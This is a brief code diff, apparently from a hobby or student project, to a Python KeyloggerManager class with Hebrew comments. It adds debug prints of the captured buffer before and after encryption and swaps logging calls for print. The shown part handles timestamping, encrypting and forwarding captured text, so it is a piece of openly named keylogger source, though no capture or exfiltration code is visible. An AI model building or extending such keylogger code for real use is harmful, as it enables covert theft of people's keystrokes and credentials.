@@ -78,11 +78,19 @@ class KeyloggerManager:
                 self.buffer.clear()
 
             data_with_timestamp = self._add_timestamp(raw_data)
+            print("\n--- original Data ---")
+            print(data_with_timestamp)
             encrypted_data = self.encryptor.encrypt(data_with_timestamp)
+
+            # הדפסה של ההצפנה לפני שמירה
+            print("\n--- Encrypted Data ---")
+            print(encrypted_data)
+
             self._send_to_writers(encrypted_data)
-            logging.info(f"Processed {len(raw_data)} characters")
+            print(f"Processed {len(raw_data)} characters")
+
         except Exception as e:
-            logging.error(f"Error processing buffer: {e}")
+            print(f"Error processing buffer: {e}")
 
 # פונקציה שמוסיפה זמן
     def _add_timestamp(self, data: str) -> str:
